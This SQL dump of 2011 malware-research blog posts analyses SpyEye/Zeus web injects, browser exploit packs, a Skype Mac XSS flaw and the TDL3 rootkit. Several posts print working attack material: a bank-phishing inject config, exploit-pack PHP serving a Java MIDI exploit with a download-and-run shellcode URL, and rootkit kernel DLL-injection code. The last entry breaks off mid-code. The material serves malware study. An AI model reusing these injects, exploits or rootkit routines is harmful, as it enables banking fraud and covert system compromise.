INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (68, '\n(SpyEye & Zeus) Web Injects - Parameters\n', 'Aditya K Sood', '2011-07-03T06:54:00-07:00', 'We are in the process of analyzing the enormous set of web injects log and real client side code. During analysis, we found that third generation botnets (Zeus and SpyEye) use an explicit technique of injecting rogue content in the web pages of bank websites. The content is injected as inline but the plugins that are used to complete this process follows a certain set of parameters and procedure. In this post, we are going to talk about the metrics that are used to perform web injects successfully. The plugin communicates with installed bot on client side and a specific steps are followed as a part of hierarchical infection in order to trick the browser.The installed bot understands the following parameters1. set_url [Target to inject]The set_url parameter instantiates an object which points to the website which is aimed for web injects. The bot uses this parameter to scan through the HTTP requests for possible match of the website so that injection can be done.2. data_before / data_endThese parameters are used to set the injection code in an appropriate manner so that HTML code looks fine and does not show broken tags. Generally, these parameters define the base of web inject because the injected data comprises of the HTML tags to be injected before the main injection. Further, \"data_before / data_end\" also points before which HTML tag the data is required to be injected.3. data_inject | data_endThese parameters are the main killing part in which the real web injects are placed. The rogue or non legitimate JavaScript/HTML code is set in these parameters which is injected in the legitimate bank website or any proprietary financial web site.4. data_after | data_endThese are last set of parameters which are used to complete the web injects by placing requisite HTML tags at the end of web injects code. Again the purpose is to render the HTML code successfully and inline with the main webpage of website.These collective set of parameters can also be used to inject multiple code in the target website.One of the real time injected code is presented belowset_url https://target_website/login.html* GPdata_beforename=\"password\"*[/tr]data_enddata_inject[TD][FONT class=userinfo] What is your favourite meal or restaurant? [/FONT][/TD] [TD align=left width=200][INPUT tabIndex=1 name=q1] [/TD][/TR][TD][FONT class=userinfo] The name of a memorable place to you? [/FONT][/TD] [TD align=left width=200][INPUT tabIndex=1 name=q2] [/TD][/TR]    [TD][FONT class=userinfo] Your favourite film of all time? [/FONT][/TD] [TD align=left width=200][INPUT tabIndex=1 name=q3] [/TD][/TR]    [TD][FONT class=userinfo] Your favourite book of all time?  [/FONT][/TD] [TD align=left width=200][INPUT tabIndex=1 name=q4] [/TD][/TR]    [TD][FONT class=userinfo] Your favourite teacher or subject? [/FONT][/TD] [TD align=left width=200][INPUT tabIndex=1 name=q5] [/TD][/TR]    [TD][FONT class=userinfo] Your favourite TV star or show? [/FONT][/TD] [TD align=left width=200][INPUT tabIndex=1 name=q6] [/TD][/TR]                          data_enddata_afterdata_enddata_beforevar cusID*;data_enddata_injectif (document.forms[0].q1.value.length < 2) {alert(\'Please, fill answers to all questions\');document.forms[0].q1.focus();document.forms[0].loginButton.disabled = false;submitActioned = false;return false;}if (document.forms[0].q2.value.length < 2) {alert(\'Please, fill answers to all questions\');document.forms[0].q2.focus();document.forms[0].loginButton.disabled = false;submitActioned = false;return false;}if (document.forms[0].q3.value.length < 2) {alert(\'Please, fill answers to all questions\');document.forms[0].q3.focus();document.forms[0].loginButton.disabled = false;submitActioned = false;return false;}if (document.forms[0].q4.value.length < 2) {alert(\'Please, fill answers to all questions\');document.forms[0].q4.focus();document.forms[0].loginButton.disabled = false;submitActioned = false;return false;}if (document.forms[0].q5.value.length < 2) {alert(\'Please, fill answers to all questions\');document.forms[0].q5.focus();document.forms[0].loginButton.disabled = false;submitActioned = false;return false;}if (document.forms[0].q6.value.length < 2) {alert(\'Please, fill answers to all questions\');document.forms[0].q6.focus();document.forms[0].loginButton.disabled = false;submitActioned = false;return false;}data_enddata_afterdata_endThese examples clarify the fact that how exactly the web injects code works and is rendered in the webpages by the installed bot.', '', 'https://secniche.blogspot.com/2011/07/spyeye-zeus-web-injects-parameters-and.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (69, '\nSpyEye Malware Infection Framework - VB\n', 'Aditya K Sood', '2011-07-03T06:38:00-07:00', 'We have just release the first part of our research on SpyEye in Virus Bulletin Magazine. The next part of the research will be coming soon.VB - SpyEye Malware Infection Framework', '', 'https://secniche.blogspot.com/2011/07/spyeye-malware-infection-framework-vb.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (70, '\nToorCon Seattle 2011 - Browser Exploit Packs\n', 'Aditya K Sood', '2011-06-19T15:25:00-07:00', 'We gave a talk at ToorCon about the high level details of BlackHole. We will be releasing more details and complete talk in the upcoming conferences that are scheduled later this year. Toorcon Seattle 2011 - Browser Exploit Packs', '', 'https://secniche.blogspot.com/2011/06/toorcon-seattle-2011-browser-exploit.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (71, '\nBotnet Resistant Coding - HITB\n', 'Aditya K Sood', '2011-06-13T06:28:00-07:00', 'Web malware infections are proliferating, and the online banking industry has become the hottest target. Stealthy bots play a critical role in the success of these attacks. In this paper,we propose a new approach to mitigating the impact of botnet infections.Refer: HackInTheBox Paper', '', 'https://secniche.blogspot.com/2011/06/botnet-resistant-coding-hitb.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (72, '\nChrome Form Grabber - No One is Secure\n', 'Aditya K Sood', '2011-06-04T07:38:00-07:00', 'All third generation botnets have specific functionality of grabbing content in the forms present in the web pages. Bots take control of victim machines and use the concept of key-logging to steal data. It depends a lot on the browser architecture and design; how effective the form grabbing technique is applied. This is because malware needs to have full control of the sockets interface and the dependent modules on it. For example:- Internet Explorer uses WININET.dll and Mozilla uses NSPR4.dll. For these browsers, well designed form grabbing key-loggers have been seen in the wild. Zeus and SpyEye bots have inherited functionality that supports form grabbing in IE and Firefox. However, very less infections have been noticed in Google Chrome considering this functionality. This is because Google Chrome architecture is different from other browsers and the low level HTTP request/response handling is done in a bit different way. The question is the possibility of hooking Google Chrome socket interfaces in order to take control of the data that in POST and GET requests mainly. For security reasons, critical data is sent using POST in forms. That\'s a generic fact.Google Chrome does not use WININET interface to communicate with the server. Google Chrome introduced the support of Web Sockets in order to avoid the complexities of asynchronous communication using XMLHttpRequest (XHR). Web sockets provide an ease of bidirectional communication. The truth is Google Chrome has also fallen into the hands of predators. Our team has noticed and found traces of effective Google Chrome form grabber that performs incessant hooking into chrome.cpp network interface functions in order to capture all the data and URL to which request is sent. It means, in the coming time we will see bots equipped with robust Google Chrome form grabbing (SpyEye is already started) functionality. Let\'s have a walk around1. In first step, Google Chrome PID is detected.2. The PID maps to Google Chrome executable file (chrome.exe) on the hard disk present in the users directory in order to control the path of the application.\\Device\\Hard Disk Volume1\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe3. The hook module initiates a callback function which is supposed to capture and store the information coming back from forms. The hook is installed in the chrome.exe and injection is initiated. When a user opens a gmail account page and  submits data to server, the hook module executes callback function which retrieves the URL and POST/GET parameters before sending it to the server.4. In order to execute the hook successfully, all the previous Object Entry Points (OEP\'s) are flushed and new OEP is initiated for different domains.5. NT_Resume_Thread call is used effectively in the hook procedure and it seems that related hooked functions are found and called during run time based on patterns.The below presented screenshot shows the debug layout of Google Chrome formgrabber  Nothing is secure as it is proclaimed to be. Welcome Google Chrome to the malicious world?', '', 'https://secniche.blogspot.com/2011/06/google-chrome-form-grabber-hooking-at.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (73, '\nVirus Bulletin - Browser Malware Taxonomy\n', 'Aditya K Sood', '2011-06-02T06:32:00-07:00', 'In this paper, we propose a taxonomy of browser malware.We classify browser add-ons, emphasizing their privileges. Since privileges impact the capability of malware, we use the resulting classification as a basis for our taxonomy. We hope that this taxonomy will provide better insight into the techniques and tactics used by browser malware, and assist in the development of defences. Subscribers : A Browser Malware TaxonomyEnjoy!', '', 'https://secniche.blogspot.com/2011/06/virus-bulletin-browser-malware-taxonomy.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (74, '\nElsevier NESE - Spying on the Browser -  Paper\n', 'Aditya K Sood', '2011-05-24T05:35:00-07:00', 'Elsevier NESE - Spying on Browsers', '', 'https://secniche.blogspot.com/2011/05/elsevier-nese-spyingon-browsers-paper.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (75, '\nHackInTheBox AMS - Spying on SpyEye\n', 'Aditya K Sood', '2011-05-20T16:04:00-07:00', 'We presented a talk regarding our research on SpyEye at HackInTheBox security conference. Thanks to Rohit for all his support and working with me on this research.  Spying on SpyEye - What Lies Beneath ?  You can fetch the presentation from HackInTheBox Security Conference Website.', '', 'https://secniche.blogspot.com/2011/05/hackinthebox-ams-spying-on-spyeye.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (76, '\nDoD CrossTalk - Browser UI Design Flaws\n', 'Aditya K Sood', '2011-05-10T09:41:00-07:00', 'We have just published \"Browser UI Interface Design Flaws\" paper in Department of Defense CrossTalk Journal. Have a nice read.', '', 'https://secniche.blogspot.com/2011/05/dod-crosstalk-browser-ui-design-flaws.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (77, '\nSkype IM (MAC OS X)  -  Is this the 0day ?\n', 'Aditya K Sood', '2011-05-07T09:56:00-07:00', 'Recently, we have came across about the news on SKYPE 0 DAY that results in remote exploitation on MAC OS. However, we have also discovered the same pattern of vulnerability in Skype two months ago. Due to testing reasons, we were not indulged in the process of reporting it to vendor because we were looking at the malware paradigm related to this vulnerability(whether it can be exploited to download malware in MAC OSX).Firstly, we are not sure whether the researchers are talking about the same vulnerability. This is because we have seen the news but the vulnerability details are missing everywhere. So our team thought to take a step in this direction. We are presenting the details of the vulnerability that we discovered in Skype running over MAC OS. Discussion:JavaScript is used extensively in all web related platforms. Skype application on MAC OS uses JavaScript too (most of the chatting client uses that, so not a big deal). This vulnerability does not impact the Skype running over windows and Linux. Skype fails to instantiate between the payloads that are sent as hyperlinks in the chat window. Only the legitimate users in the client list of victim can exploit it. The attacker only requires a definitive payload to exploit this issue. Basically, we call it as a Skype Remote Scripting (Injection).Working:In order to trigger this vulnerability, you need to find a vulnerable website that can be used as an agent to send our payload. For example: attacker can use third party vulnerable website to trigger scripting injection in Skype (MAC OS). Generally, certain truth prevails as follows1. If an attacker sends a remote script payload as [script]alert(document.location);[script];skype filters this injection on chat engine which is quite normal. We have used square brackets (for representation) but for real injections one has to use angle brackets as XSS payloads.2. Skype(MAC OS) fails to filter the injection in which payload is sent as a part of third part vulnerable website hyperlink as follows   http://www.vulnerablewebsite.com/index.php?url=[script]alert(document.location);[script]A = http://www.vulnerablewebsite.com/index.php?url=B = [script]alert(document.location);[script]Skype fails to treat it as one hyperlink as (A+B). As a result, B part executes in the context of Skype(MAC OS) thereby resulting in remote scripting in the skype.3. Attacker can use DOM injections to write arbitrary content in the chat window. There can be advanced variations of it.4. We know MAC runs applications with extensions .app, it is possible to download malicious applications through skype. One can also trigger Safari automatically using DOM calls such as \"window.open\".5. This vulnerability does not require any user interaction and runs payload directly. One has to be careful because it can execute content in both chat windows if an attacker and victim is using Skype (MAC OS). Attacker can use Skype on Windows and Linux in order to execute this attack.Some of the POC\'s are presented in the below mentioned snapshots which supports the execution of this vulnerability.Injection 1:Injection 2:Injection3:This is really devastating from security point of view. All the versions before 5.1.0.922 are vulnerable. However, we still think the variation of this type of issues are possible and vulnerable versions can be exploited differently. Since it is executing scripts , we can say that this vulnerability can be used in worm infections.Is this the 0day Skype Bug? Let see what the other researchers release.', '', 'https://secniche.blogspot.com/2011/05/skype-im-mac-os-x-is-this-0day.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (78, '\nFinest 5 - Java Exploits on Fire\n', 'Aditya K Sood', '2011-05-04T19:23:00-07:00', 'Since the origin of browser exploit packs, we have noticed a serious change in the effectiveness of exploitation ratio due to origin of critical vulnerabilities. However, we have noticed and observed recently about the explicit use of Java vulnerabilities by Browser Exploit Packs (BEP\'s). Java has become the most prominent exploitation vector now a days. BEP\'s such as BlackHole and Phoenix are using Java exploits explicitly for triggering infections. Consequentially, the highest infection rate is an outcome of these Java exploits. Java being platform independent is the preferred choice of attackers in order to attack victim machines. The Java exploits that are on fire are as follows1. Sun Java Runtime Environment Trusted Methods Chaining Remote Code Execution Vulnerability (CVE-2010-0840)2. Java JRE MixerSequencer Invalid Array Index Remote Code Execution Vulnerability   (CVE-2010-0842) | Java JMF MIDI3. Java Unspecified vulnerability in the Java Deployment Toolkit component in Oracle Java SE (CVE-2010-0886)4. Sun Java Runtime RMIConnectionImpl Privileged Context Remote Code Execution Vulnerability (CVE-2010-0094) | Java RMI5. Java argument injection vulnerability in the URI handler in Java NPAPI plugin (CVE-2010-1423)The latest addition to Java exploit is CVE-2010-4452 which presents a flaw exists within the findClass method of the sun.plugin2.applet.Applet2ClassLoader class.Serving these exploits are quite easy by simply pushing Jar file as follows[object id=\"java_obj\" classid=\"clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA\" width=\"0\" height=\"0\"][PARAM name=\"launchjnlp\" value=\"1\"][PARAM name=\"docbase\" value=\"][/object][embed type=\"application/x-java-applet\" width=\"0\" height=\"0\" launchjnlp=\"1\" docbase=\"\';include \'../config.php\';include \'../include/shellcode.php\';$shellcode = shellcode_dl_exec ($config_url . \'/drop.php?e=Java-2010-0842\');$rmf = \'IREZ\' . \'SONGmSËm\' . \' \' . \'\' . \'\' . \'ITLŸ±µ~ûpœ†þ°5\' . \'“â^Þ÷\' . \'ÿ\' . \'\' . \'8ÿ ÉPQRSVW\' . $shellcode;header (\'Expires: Mon, 26 Jul 1997 05:00:00 GMT\');header (\'Cache-Control: no-cache\');header (\'Pragma: no-cache\');header (\'Accept-Ranges: bytes\');header (\'Content-Length: \' . strlen ($rmf) . \'\');header (\'Content-Disposition: inline; filename=midi20100842.rmf\');header (\'\');header (\'Content-Type: application/x-msdownload\');So we cannot ignore the easiness of spreading malware by exploiting Java vulnerabilities. For example consider the below stated exploit triggerinclude_once \'config.php\'; echo \' [Applet Code=\"ToolsDemo.class\" archive=\"\'; echo $config_url . \'/exploits/Java-2010-0842.jar\'; echo \'\" width=\"0\" Height=\"1\"]  [PARAM NAME=\"URL\" VALUETYPE=\"ref\" VALUE=\"\'; echo $config_url . \'/exploits/Java-2010-0842Helper.php\'; [/applet]\';On decompiling Java-2010-0842.jar, we getimport java.applet.Applet;import java.io.*;import javax.sound.midi.*;public class ToolsDemo extends Applet{public ToolsDemo(){}public void init()    {        String s = getParameter(\"URL\");        try        {            InputStream inputstream = getClass().getResourceAsStream(s);            ByteArrayOutputStream bytearrayoutputstream = new ByteArrayOutputStream();            byte abyte0[] = new byte[1024];            int i;            while((i = inputstream.read(abyte0)) != -1)                 bytearrayoutputstream.write(abyte0, 0, i);            ByteArrayInputStream bytearrayinputstream = new ByteArrayInputStream(bytearrayoutputstream.toByteArray());            ToolsDemoSubClass toolsdemosubclass = new ToolsDemoSubClass();            javax.sound.midi.MidiDevice.Info ainfo[] = MidiSystem.getMidiDeviceInfo();            MidiDevice mididevice = MidiSystem.getMidiDevice(ainfo[0]);            Sequencer sequencer = null;            sequencer = (Sequencer)mididevice;            sequencer.open();            sequencer.setSequence(bytearrayinputstream);            sequencer.addControllerEventListener(toolsdemosubclass, new int[] {                0            });            sequencer.start();        }        catch(Exception exception) { }    }public String getAppletInfo(){return \"Tools Demo\";}}Something is really on fire :)', '', 'https://secniche.blogspot.com/2011/05/finest-5-java-exploit-on-fire.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (79, '\nFirefox Fake AV Alerts  - Malware Trigger\n', 'Aditya K Sood', '2011-05-03T14:50:00-07:00', 'Malware writers are opting aggressive techniques to infect users with malicious programs. Browsers are always been the prime exploitation paradigm. What else could be better than Anti Virus Alerts in browsers? Recent trend encompasses manipulation of Firefox(supporting other browsers too) in order to trigger malicious AV alerts there by forcing user to download malicious executable. For security researchers, detecting these alerts are not that hard task. However, normal users find themselves in havoc from the fear of being infected when they face these malicious alerts. Infact, this process exploits the ignorance or one can say fear of users by social engineering tricks. In order to remove malware from system (fake alert notifications) users intentionally install malicious program on their machines. Generally, these alerts are not browser specific rather browser independent. It is also possible that these alerts trigger only when User Agent Based Fingerprinting (USBF) is done . There are many scenarios. The below presented snapshot shows how Firefox is manipulatedOn successful scans, it alerts lot of security issues for the presence of trojans, backdoors and rootkits etc. Despite of the hilarious fact that, your system level AV engine stays calm. Well, visualization of threats have its own implication. On completion of scans, these alerts force users to install following file (specific for domain we are analyzing)Further, Mozilla inbuilt bad site reporting service works collectively with stopbadware.org. Firefox uses redirection to redirect user to the legitimate domain (stopbadware.org) on ignoring the warning. That is something we all know.[REQUEST]GET /?hl=en-US&url=http%3A%2F%2Fupdate82.sashrod.ce.ms%2Findex.php%3FQ1Xhk9SJbYJGPXpjM%2FtL5is7E974ZjcioT7yKQchpNjVUC%2B1hEwpaVGuq1zgdVqksMShxC9dHBs2rpwYqQjCVkTeZbDJDe1pKU0ChURY HTTP/1.1Host en-us.malware-error.mozilla.comUser-Agent Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 ( .NET CLR 3.5.30729; .NET4.0C)Accept text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language en-us,en;q=0.5Accept-Encoding gzip,deflateAccept-Charset ISO-8859-1,utf-8;q=0.7,*;q=0.7Keep-Alive 115DNT 1Connection keep-alive[RESPONSE](Status-Line) HTTP/1.1 302 FoundDate Tue, 03 May 2011 22:28:08 GMTServer ApacheX-Backend-Server pm-web02Location http://www.stopbadware.org/firefox?hl=en-US&url=http%3A%2%2Fupdate82.sashrod.ce.ms%2Findex.php%3FQ1Xhk9SJbYJGPXpjM%2FtL5is7E974ZjcioT7yKQchpNjVUC%2B1hEwpaVGuq1zgdVqksMShxC9dHBs2rpwYqQjCVkTeZbDJDe1pKU0ChURYContent-Length 394Keep-Alive timeout=20, max=996Connection Keep-AliveContent-Type text/html; charset=iso-8859-1This discussion clearly indicates the fact that how badly browsers are getting manipulated. Consequentially, browsers are always at stake so do users despite of our protection efforts.', '', 'https://secniche.blogspot.com/2011/05/firefox-av-fake-malware.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (80, '\nReverse Hijacking Web AV Engines\n', 'Aditya K Sood', '2011-05-02T16:40:00-07:00', 'Web anti virus engines are used explicitly to perform behavioral analysis on the active malware. Is it possible for us to run some controlled binary in order to trace all the information of cloud infrastructure of virtual machines that collaboratively perform analysis of malicious executables? We have proved that in the past it is possible to hijack (information extraction) from the hidden servers in the cloud used for malware analysis. The technique discussed in the white-paper can be used in different scenarios in order to trick internal vmware servers to steal sensitive information and there by attacking in return. Goodwill Hunting :)Reverse hacking proves beneficial in many scenarios.', '', 'https://secniche.blogspot.com/2011/05/reverse-hijacking-web-av-engines.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (81, '\nTDL3 Rookit Implicit Analysis  (Part 2)\n', 'Aditya K Sood', '2011-04-30T20:40:00-07:00', 'In our last post about TDL rootkit, we discussed about the some of the generic features of TDL rootkit. As we know, all of the rootkits somewhat use DLL Hijacking technique. Same is true with TDL rootkit too. DLLInject function is presented below. Generally, this function use is designed in TDL rootkit to load the malicious or systems specific DLL directly from the path defined (*pcDll!=\'\\\\\'). The malicious DLL can be loaded from the root directory of TDL rootkit. If no path is provided then it uses the explicit path define in the parameter cDllRealFormat[]=. After this, the code tries to find the unique process identifier of the process and not the process handle as specified in the parameter cidProcess.UniqueProcess=hProcessID;. \"ZwOpenProcess\" functions opens the specific process and virtual memory is allocated using \"(ZwAllocateVirtualMemory\". By using KeStackAttachProcess  the module attaches the current thread to the address space of the target process. After copying the real path \"pcDllReal\" to the memory. As soon as this is completed, KeUnstackDetachProcess routine detaches the current thread from the address space of a process and restores the previous attach state.NTSTATUS DllInject(HANDLE hProcessID,PEPROCESS pepProcess,PKTHREAD pktThread,PCHAR pcDll,BOOLEAN bAlert){ HANDLE hProcess; OBJECT_ATTRIBUTES oaAttributes={sizeof(OBJECT_ATTRIBUTES)}; CLIENT_ID cidProcess; PVOID pvMemory=0; DWORD dwSize; CHAR cDllReal[MAX_PATH]; CHAR cDllRealFormat[]={\'\\\\\',\'\\\\\',\'?\',\'\\\\\',\'g\',\'l\',\'o\',\'b\',\'a\',\'l\',\'r\',\'o\',\'o\',\'t\',\'%\',\'S\',\'\\\\\',\'%\',\'S\',\'\\\\\',\'%\',\'s\',0}; PCHAR pcDllReal;if(*pcDll!=\'\\\\\') {  dwSize=_snprintf(cDllReal,RTL_NUMBER_OF(cDllReal)-1,cDllRealFormat,  GET_TDL_ADDRESSES->wcFSDevice,GET_TDL_ADDRESSES->wcTDLDirectory,pcDll)+1;  pcDllReal=cDllReal; } else {  pcDllReal=pcDll;  dwSize=strlen(pcDll)+1; } cidProcess.UniqueProcess=hProcessID; cidProcess.UniqueThread=0; if(NT_SUCCESS(ZwOpenProcess(&hProcess,PROCESS_ALL_ACCESS,&oaAttributes,&cidProcess))) {   if(NT_SUCCESS(ZwAllocateVirtualMemory(hProcess,&pvMemory,0,&dwSize,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE)))  {   KAPC_STATE kasState;   PKAPC pkaApc;   KeStackAttachProcess(pepProcess,&kasState);   strcpy(pvMemory,pcDllReal);   KeUnstackDetachProcess(&kasState);   pkaApc=(PKAPC)ExAllocatePool(NonPagedPool,sizeof(KAPC));   if(pkaApc!=0)   {KeInitializeApc(pkaApc,pktThread,0,ADDRESS_DELTA(PKKERNEL_ROUTINE,APCKernelRoutine),0,GET_TDL_ADDRESSES->pvLoadLibraryExA,UserMode,pvMemory);    KeInsertQueueApc(pkaApc,0,0,IO_NO_INCREMENT);    return STATUS_SUCCESS;   }  }  ZwClose(hProcess); } return STATUS_NO_MEMORY;}This module is used directly in conjunction with WIInjector in order to complete DLL injection. The WIInjector code is somewhat works as followsVOID WIInjector(PVOID pvContext){CHAR cAny[]=TDL_CONFIG_INJECTOR_ANY;CHAR cSection[]=TDL_CONFIG_INJECTOR;CHAR cDll[MAX_PATH];CHAR cSection2[]=TDL_CONFIG_MAIN;CHAR cKey[]={\'d\',\'a\',\'t\',\'e\',0};DWORD dwDate=TDLIniReadDword(GET_TDL_ADDRESSES->wcTDLConfig,cSection2,cKey,0);DWORD dwCurrent; LARGE_INTEGER liTime;KeQuerySystemTime(&liTime);RtlTimeToSecondsSince1970(&liTime,&dwCurrent);//CHAR cDebug[]={\'D\',\'A\',\'T\',\'E\',\'%\',\'d\',\' \',\'%\',\'d\',\' \',\'%\',\'d\',\' \',\'%\',\'d\',\'\\n\',0};//DbgPrint(cDebug,dwDate,dwCurrent,dwCurrent-dwDate,0);//if(dwCurrent-dwDate>=60*24*60){ DbgPrint(cDebug,dwDate,dwCurrent,dwCurrent-dwDate,1);if(TDLIniReadString(GET_TDL_ADDRESSES->wcTDLConfig,cSection,cAny,0,cDll,sizeof(cDll))){DllInject(((PWI_INJECT)pvContext)->hProcessID,((PWI_INJECT)pvContext)->pepProcess,((PWI_INJECT)pvContext)->pktThread,cDll,FALSE);  }  if(TDLIniReadString(GET_TDL_ADDRESSES->wcTDLConfig,cSection,RtlOffsetToPointer(((PWI_INJECT)pvContext)->pepProcess,GET_TDL_ADDRESSES->dwEPNameOffset),0,cDll,sizeof(cDll))){DllInject(((PWI_INJECT)pvContext)->hProcessID,((PWI_INJECT)pvContext)->pepProcess,((PWI_INJECT)pvContext)->pktThread,cDll,FALSE); }}KeSetEvent(&((PWI_INJECT)pvContext)->keEvent,(KPRIORITY)0,FALSE);return;}In the above presented code, TDL uses a specific configuration file in order to load information such as PID from parameters as \"cAny[]=TDL_CONFIG_INJECTOR_ANY\";\"cSection[]=TDL_CONFIG_INJECTOR;\". It uses explicit time functions in order to trigger infection. \"TDLIniReadString\" is a custom designed module which is  a part of TDL rootkit library. The DLLInject function is called when current date is verified as (dwCurrent-dwDate>=60*24*60). After this WIInjector is triggered as a part of \"APCInjectRoutine\"VOID __stdcall APCInjectRoutine(PKAPC pkaApc,PKNORMAL_ROUTINE*,PVOID*,PVOID*,PVOID*){ WI_INJECT wiiItem; ExFreePool(pkaApc); wiiItem.pktThread=KeGetCurrentThread(); wiiItem.pepProcess=IoGetCurrentProcess(); wiiItem.hProcessID=PsGetCurrentProcessId(); KeInitializeEvent(&wiiItem.keEvent,NotificationEvent,FALSE); ExInitializeWorkItem(&wiiItem.qiItem,ADDRESS_DELTA(PWORKER_THREAD_ROUTINE,WIInjector),&wiiItem); ExQueueWorkItem(&wiiItem.qiItem,DelayedWorkQueue); KeWaitForSingleObject(&wiiItem.keEvent,Executive,KernelMode,TRUE,0); return;}The discussion will remain continue in the next posts....', '', 'https://secniche.blogspot.com/2011/04/tdl3-rookit-implicit-analysis-part-2.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (82, '\nSQLXSSI - Persistent Malware Base\n', 'Aditya K Sood', '2011-04-27T16:28:00-07:00', 'With the advent of new and sophisticated malware, the modes of infection has become more efficient from previous times. The spreading of web malware takes place through web vulnerabilities which further impacts the browser interface to drop malware. Reflective XSS vulnerabilities are exploited heavily to spread malware. In last year OWASP AppSec USA conference, we presented SQLXSSI technique which has become the preferred choice of attackers to infect databases with malicious iframes and payloads.      This technique is opted to conduct mass SQL injection attacks because infecting database tables result in easy spreading of malicious content across different domains because of content sharing. It is quite a different from persistent nature of XSS because in SQLXSSI, the attacker wants to update the database table with encoded output and it remains there for long period of time. When an application, runs a specific query in the database, the payload is decoded and renders in the browser. In persistent XSS injections, payloads are passed as direct data which may or may not be stored in the database but it becomes persistent in web pages. Further, no SQL injection vulnerability is exploited. In SQLXSSI, SQL injections (Direct+Blind) are used explicitly by the attacker to inject payloads in the database in the raw format. It is retrieved back from the database based on the application design and in which tables attacker has injected the payloads. Predominantly, one vulnerability is used to trigger another which ultimately results in spreading malware. This content can be retrieved by any resources which are using the database of infected website. For example: the below presented figure shows the presence of malicious scripts inside the PDFThis PDF document is actually generated from print.asp page which fetches some content from the database, in this case it is infectious. However, our discussion in this example adheres to the way data is shared among different resources and how infectious can SQLXSSI attacks be.', '', 'https://secniche.blogspot.com/2011/04/sqlxssi-persistent-malware-base.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (83, '\nMalvertisements - Elsevier CFS Journal\n', 'Aditya K Sood', '2011-04-23T09:40:00-07:00', 'Malvertising - Exploiting Web Advertising | Elsevier Computer Fraud and Security Journal   View more documents from Aditya K Sood', '', 'https://secniche.blogspot.com/2011/04/malvertisements-elsevier-cfs-journal.html\n');
INSERT INTO `MalwareAtStake` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (84, '\nTDL3 Rootkit - Implicit Analysis (Part 1)\n', 'Aditya K Sood', '2011-04-16T09:36:00-07:00', 'TDL3 rootkit is one of the most advanced rootkit that is used in the wild for spreading malware and compromising window machines specifically. Primarily, the TDL3 rootkit is very stable from execution point of view. Previously, the rootkit was supposed to infect 32 bit systems but latest versions are impacting the windows x64 bit boxes. in the previous times, we have noticed rootkits that impact Master Boot Record (MBR) and these are termed as vbootkits. However, TDL3 rootkit is showing infections that are specifically targeting MBR\'s. In this post , we are going to discuss about the TDL3 rootkit design and its impact. This analysis is basically used to discuss all the routines used by TDL3 rootkit and is divided into number of posts. This is the first post and further details will be discussed in later posts. TDL3 rootkit uses most of the function from windows driver framework libraries discussed in wdm.h and it loaded itself as a device driver.[1] Getting the Offset of System Process:TDL3 rootkit uses the listed technique of getting the offset of System (System 0) process from the current process (rootkit process) in execution. It uses RtlOffsetToPointer() function to locate the process offset from the given base address. The base address is extracted by using IoGetcurrentProcess() which returns a pointer to the based address. With respect to it, the offset of \"SYSTEM 0\" process is calculated which is nothing but the first process that is spawned by windows.\"SYSTEM 0\" value  is passed as a string of chars to the cSystem array[]. Once the function is called it is loaded effectively into the memory to set the base address VOID GetEPNameOffset(){ CHAR cSystem[]={\'S\',\'y\',\'s\',\'t\',\'e\',\'m\',0}; GET_TDL_ADDRESSES->dwEPNameOffset=0;  while(memcmp(RtlOffsetToPointer(IoGetCurrentProcess(), GET_TDL_ADDRESSES->dwEPNameOffset),cSystem,sizeof(cSystem))!=0) { GET_TDL_ADDRESSES->dwEPNameOffset++; } return;}[2] Getting NT OS Kernel BaseTDL3 rootkit tries to find the base address of ntoskrn.exe in order to take control of the low level system functioning. In the code presented below, \"__asm { sidt bIDT; }\" declares SIDT instruction which is used to find Interrupt Descriptor Table(IDT) address in the memory. It basically returns the IDTINFO structure in which entries are segregated in lower WORD and high WORD values. In IDTINFO structure, each entry has its own structure which is 64 bit long. Each entry contains the address of the function that handles a specific interrupt. Interrupt handler = Address(Hi Offset + Lo Offset).__declspec(noinline) PVOID GetNtoskrnlBase(){BYTE bIDT[6];PIDT_ENTRY pieIDTEntry;PWORD pwAddress;__asm { sidt bIDT; }pieIDTEntry=(PIDT_ENTRY)(*((PDWORD_PTR)&bIDT[2])+8*0x40);pwAddress=PWORD(pieIDTEntry->dw64OffsetLow|(pieIDTEntry->dw64OffsetHigh<<16));do { pwAddress=(PWORD)ALIGNDOWN(pwAddress,PAGE_SIZE); if(*pwAddress==\'ZM\') { return (PVOID)pwAddress; }  